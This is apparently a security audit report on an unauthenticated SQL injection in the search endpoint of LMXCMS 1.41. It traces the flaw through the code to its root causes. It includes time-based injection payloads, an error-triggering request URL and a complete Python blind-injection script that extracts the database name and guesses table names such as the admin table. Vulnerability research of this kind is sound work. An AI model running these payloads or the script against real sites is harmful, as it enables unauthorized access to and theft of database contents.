- # LMXCMS 1.41 Frontend Search Unauthorized SQL Injection Code Report

  Audit Date: 2026-04-13  
  Target Project: `D:\phpstudy_pro\WWW\202106281714266126\lmxcms1.41`  
  Analysis Target: The SQL injection formation chain, code-level root cause, filtering impact, and exploitability assessment of the frontend search endpoint `/index.php?m=Search&a=index`

  ## 1. Executive Summary

  The root cause of this vulnerability is not a single-point "forgot to escape" issue, but that the entire search chain directly concatenates the user-controllable `field` parameter into the `LIKE` condition as an SQL field expression, while the underlying layer still uses string concatenation + `mysql_*` for execution.

  From a code auditing perspective, the full path of this vulnerability chain is:

  1. Frontend routing dispatches to `SearchAction`
  2. `SearchAction` reads `field` from `$_GET`
  3. The so-called filtering only performs `strip_tags`, `urldecode`, `addslashes`, and a keyword blacklist
  4. `SearchModel::sqlStr()` directly concatenates `field` into `$v." like '%".$search['keywords']."%'"`
  5. `db::where()` assembles this concatenated expression into `WHERE`
  6. `db::countDB()` / `db::selectDB()` build the full SQL statement
  7. `db::query()` executes it directly and echoes MySQL errors to the frontend

  From an exploitability perspective, this sink has two important characteristics:

  - **Error-based SQL injection is valid**
  - **Boolean/time-based conditional inference is valid**

  But at the same time, this sink also has two constraints:

  - `field` is first split by commas through `explode(',')`
  - The blacklist blocks `select/from/insert/update/drop/...`

  Therefore:

  - Common error-based data extraction payloads such as `extractvalue(1,concat(...))` and `updatexml(...)` are easily "broken apart"
  - But boolean/time-based payloads that do not rely on comma-based subqueries can still be exploited reliably

  ## 2. Entry Point and Route Dispatch

  The unified frontend entry is [index.php](D:/phpstudy_pro/WWW/202106281714266126/lmxcms1.41/index.php), which loads [inc/run.inc.php](D:/phpstudy_pro/WWW/202106281714266126/lmxcms1.41/inc/run.inc.php).

  The core dispatch code is located at:

  - `inc/run.inc.php:68-73`

  ```php
  $extendEnt = RUN_TYPE == 'extend' ? 'AExtend' : 'Action';
  $m=isset($_GET['m']) ? ucfirst(strtolower($_GET['m'])) : 'Index';
  if(!class_exists($m.$extendEnt)){ $m = 'Index'; }
  eval('$action=new '.$m.$extendEnt.'();');
  eval('$action->run();');
  ```

  ![image-20260413143106290](./../../source/imgs/lmxcms-sql/image-20260413143106290.png)

  Therefore, the following request:

  ```text
  /index.php?m=Search&a=index&...
  ```

  will enter:

  - Controller class: `c/index/SearchAction.class.php`
  - Method: `SearchAction::index()`

  ## 3. Vulnerability Source: How User Input Enters Search Parameters

  Parameter reception and preprocessing are located at:

  - `c/index/SearchAction.class.php:67-88`

  Key code:

  ![image-20260413143117281](./../../source/imgs/lmxcms-sql/image-20260413143117281.png)

  ```php
  $_GET = filter_strs($_GET);
  $data = p(2,1,1);
  $this->param['keywords'] = string::delHtml($data['keywords']);
  $this->param['classid'] = (int)$data['classid'];
  $this->param['mid'] = (int)$data['mid'];
  $this->param['tem'] = $data['tem'];
  $this->param['field'] = $data['field'];
  $this->param['time'] = $data['time'] ? $data['time'] : $this->config['search_time'];
  ```

  The key facts here are:

  - `field` is fully user-controlled
  - The program does not restrict `field` to a fixed whitelist of fields such as `title,keywords,description`
  - Before entering the model, `field` is not forcibly mapped to predefined column names

  This determines that the SQL structure afterward will be directly influenced by the user.

  ## 4. Why the So-Called Filtering Is Not Effective Protection

  ### 4.1 `filter_strs()` Only Performs Weak Sanitization

  Location:

  - `function/common.php`

    ![image-20260413143126475](./../../source/imgs/lmxcms-sql/image-20260413143126475.png)

  ```php
  $data = urldecode($data);
  $data = strip_tags($data);
  $data = str_replace('%','',$data);
  ```

  Problems:

  - This can only remove HTML tags and `%`
  - It provides no substantive protection against SQL structure injection
  - It is especially ineffective against injection at the field-expression position

  ### 4.2 `p(2,1,1)` Is Only Recursive `addslashes` + Blacklist

  Location:

  - `function/common.php:`

  ![image-20260413143137524](./../../source/imgs/lmxcms-sql/image-20260413143137524.png)

  `addslashes()` has some impact in traditional string contexts, but the injection point here is not a typical `'...user input...'` string concatenation. Instead, it is at the field/expression position, so the protection effect is very weak.

  ### 4.3 `filter_sql()` Is a Keyword Blacklist

  Location:

  - `function/common.php10-224`

  ![image-20260413143145427](./../../source/imgs/lmxcms-sql/image-20260413143145427.png)

  The effect brought by this layer of filtering is not that it "fixed SQLi", but rather:

  - It blocks some obvious payloads
  - It causes many error-based or subquery payloads based on `select/from` to fail directly
  - It misleads testers into thinking that "hard to exploit = no vulnerability"

  But in reality, **conditional expressions that do not contain these keywords can still enter the SQL**, for example:

  - `sleep(...)`
  - `1=1`
  - `title like 0x...`
  - `database()=0x...`

  ## 5. The Actual Point Where the Vulnerability Forms: `SearchModel::sqlStr()`

  This function is located at:

  - `m/SearchModel.class.php:96-152`

  The most critical vulnerable code is located at:

  - `m/SearchModel.class.php:130-135`

    ![image-20260413143156392](./../../source/imgs/lmxcms-sql/image-20260413143156392.png)

  ```php
  $search['field'] = explode(',',$search['field']);
  foreach($search['field'] as $v){
      $like[] = $v." like '%".$search['keywords']."%'";
  }
  $param['like'] = '('.implode(' or ',$like).')';
  ```

  There are three direct consequences here:

  ### 5.1 `field` Is Directly Used as an SQL Field Expression

  For example, if the user passes:

  ```text
  field=title
  ```

  then it becomes:

  ```sql
  title like '%keyword%'
  ```

  ### 5.2 `field` Is Not Just a "Field Name", It Can Become an Expression

  If the user passes:

  ```text
  field=title) or sleep(5) or (title
  ```

  then it becomes:

  ```sql
  title) or sleep(5) or (title like '%keyword%'
  ```

  In other words, the program does not perform any isolation at all between a "field name" and an "expression".

  ### 5.3 Commas Break the Payload First

  Because the code first executes:

  ```php
  explode(',',$search['field'])
  ```

  payloads like the following:

  ```text
  extractvalue(1,concat(0x7e,database()))
  ```

  are first split into multiple segments, and afterward each segment is again concatenated with ` like '%keyword%'`, causing the function argument structure seen by the database to no longer be the original payload.

  This is why many error-based functions at this injection point produce "incorrect parameter count" instead of normally echoing back the data you want.

  ![image-20260413143226369](./../../source/imgs/lmxcms-sql/image-20260413143226369.png)

  ## 7. How the SQL Is Further Assembled

  ### 7.1 `searchCoutn()` First Triggers a Vulnerable Count Query

  Location:

  - `c/index/SearchAction.class.php`

    ![image-20260413143235321](./../../source/imgs/lmxcms-sql/image-20260413143235321.png)

  - `m/SearchModel.class.php:89-93`

    ![image-20260413143241032](./../../source/imgs/lmxcms-sql/image-20260413143241032.png)

  ```php
  $arr = $this->searchModel->getSerachField($this->param);
  $count = $this->searchModel->searchCoutn($arr);
  ```

  ```php
  $param = $this->sqlStr($searchInfo);
  $param['force'] = 'title';
  return parent::countModel($param);
  ```

  That is to say, **the vulnerable SQL is already executed as soon as the page is entered**, even before it reaches the list-rendering stage.

  ### 7.2 `countModel()` -> `countDB()` -> `where()` Concatenate the Full Query

  Location chain:

  - `class/Model.class.php:36-38`
  - `class/db.class.php:27-33`
  - `class/db.class.php:170-190`

  `countDB()`:

  ![image-20260413143251584](./../../source/imgs/lmxcms-sql/image-20260413143251584.png)

  ```php
  $We = $this->where($param);
  $sql="SELECT count(1) FROM ".DB_PRE."$tab $We";
  ```

  `where()`:

  ![image-20260413143257134](./../../source/imgs/lmxcms-sql/image-20260413143257134.png)

  ```php
  if($param['where']){
      $We =  ' WHERE '.implode(' AND ',$We);
  }
  ...
  if($param['like']){
      $like = $param['where'] ? ' AND '.$param['like'] : ' WHERE '.$param['like'];
  }
  ...
  return $We.' '.$like.' '.$order.' '.$limit;
  ```

  Therefore, the vulnerable `$param['like']` is ultimately concatenated into the `WHERE ... AND (...)` structure.

  ## 8. Why This Vulnerability Directly Echoes MySQL Errors

  The underlying execution is located at:

  - `class/db.class.php:148-153`

  ```php
  $query=mysql_query($sql);
  if(!$query){
      exit('sql语句有误'.mysql_error());
  }
  ```

  This means:

  - Syntax errors are not swallowed
  - Raw MySQL errors are returned directly to the browser

  Therefore, when you access the following in the browser:

  ```text
  /index.php?m=Search&a=index&classid=5&keywords=11111111111&field=title%27
  ```

  and see:

  ![image-20260413143306785](./../../source/imgs/lmxcms-sql/image-20260413143306785.png)

  ```text
  sql statement error You have an error in your SQL syntax ...
  ```

  

  ### Time-based payloads such as `sleep(5)` work

  For example:

  ```text
  field=title) or sleep(5) or (title
  ```

  Reasons:

  - Does not rely on commas
  - Does not rely on `select/from`
  - Directly uses expression-position injection for boolean/time logic

  Write a blind injection script to extract the database name

  ```
  import requests
  import time
  
  BASE_URL = "http://192.168.50.1:8091/index.php"
  PARAMS_BASE = {
      "m": "Search",
      "a": "index",
      "classid": "5",
      "tem": "index",
      "keywords": "a"
  }
  SLEEP_TIME = 5
  THRESHOLD = 4
  
  
  def to_hex(s):
      return "0x" + s.encode().hex() + "25"  # 25 = %
  
  
  def check_delay(field_payload):
      params = PARAMS_BASE.copy()
      params["field"] = field_payload
      start = time.time()
      try:
          requests.get(BASE_URL, params=params, timeout=15)
      except:
          pass
      return time.time() - start
  
  
  def extract_string(sql_expr, max_len=50):
      result = ""
      chars = "abcdefghijklmnopqrstuvwxyz0123456789_-{}"
  
      for pos in range(1, max_len + 1):
          found = False
          for c in chars:
              test = result + c
              hex_val = to_hex(test)
              payload = f"title) or ({sql_expr} like {hex_val} and sleep({SLEEP_TIME})) or (title"
              elapsed = check_delay(payload)
              print(f"  Test: {test!r} -> {elapsed:.2f}s")
  
              if elapsed > THRESHOLD:
                  result = test
                  print(f"[+] Position {pos}: {c}  Current result: {result}")
                  found = True
                  break
  
          if not found:
              print(f"[*] Extraction complete: {result}")
              break
  
      return result
  
  
  def get_tables(db_name):
      # Use like to guess table names one by one, enumerating common prefixes first
      print("\n[*] Starting table name enumeration...")
      common_tables = ["flag", "lmx_flag", "lmx_admin", "admin", "user", "lmx_user"]
      for t in common_tables:
          hex_val = "0x" + t.encode().hex()
          payload = f"title) or ((select count(*) from information_schema.tables where table_name like {hex_val}) and sleep({SLEEP_TIME})) or (title"
          elapsed = check_delay(payload)
          print(f"  Testing table name {t!r} -> {elapsed:.2f}s")
          if elapsed > THRESHOLD:
              print(f"[+] Found table: {t}")
              return t
      return None
  
  
  if __name__ == "__main__":
      print("=" * 50)
      print("[*] Starting database name extraction...")
      db_name = extract_string("database()")
      print(f"\n[+] Database name: {db_name}")
  
  
  ```

  ![image-20260413143324654](./../../source/imgs/lmxcms-sql/image-20260413143324654.png)

  ![image-20260413143329465](./../../source/imgs/lmxcms-sql/image-20260413143329465.png)

  Successfully exploited

  ## 11. Root Cause of the Vulnerability

  From a code auditing perspective, the formation of this vulnerability is not due to a single function, but to the combination of the following design issues:

  1. User-controlled `field` is used as an SQL expression  
     File: `c/index/SearchAction.class.php:84-85`

  2. The program does not perform field whitelist mapping  
     File: `m/SearchModel.class.php:130-135`

  3. The entire chain still uses string concatenation to build SQL  
     File: `class/db.class.php:27-33`, `class/db.class.php:81-90`, `class/db.class.php:170-190`

  4. Security controls rely on a blacklist rather than parameterization  
     File: `function/common.php:210-224`

  5. Database errors are directly echoed  
     File: `class/db.class.php:149-153`

  ## 12. Related File Summary

  - Route dispatch: `inc/run.inc.php:68-73`
  - Controller entry: `c/index/SearchAction.class.php:11-16`
  - Parameter reception: `c/index/SearchAction.class.php:67-88`
  - Rate limiting: `c/index/HomeAction.class.php:35-39`
  - Weak filtering entry: `function/common.php:171-224`
  - Main logic of search model: `m/SearchModel.class.php:96-152`
  - Affected query trigger: `m/SearchModel.class.php:89-93`
  - ORM wrapper layer: `class/Model.class.php:29-38`
  - SQL assembly and execution: `class/db.class.php:27-33`, `class/db.class.php:81-90`, `class/db.class.php:148-190`
  - Mapping from category to data table: `data/public/class.php:109-133`
  - Mapping from model to data table: `data/public/module.php:5-18`

  ## 13. Final Assessment

  From a code auditing perspective, this frontend search vulnerability should be classified as:

  - **Unauthorized SQL Injection**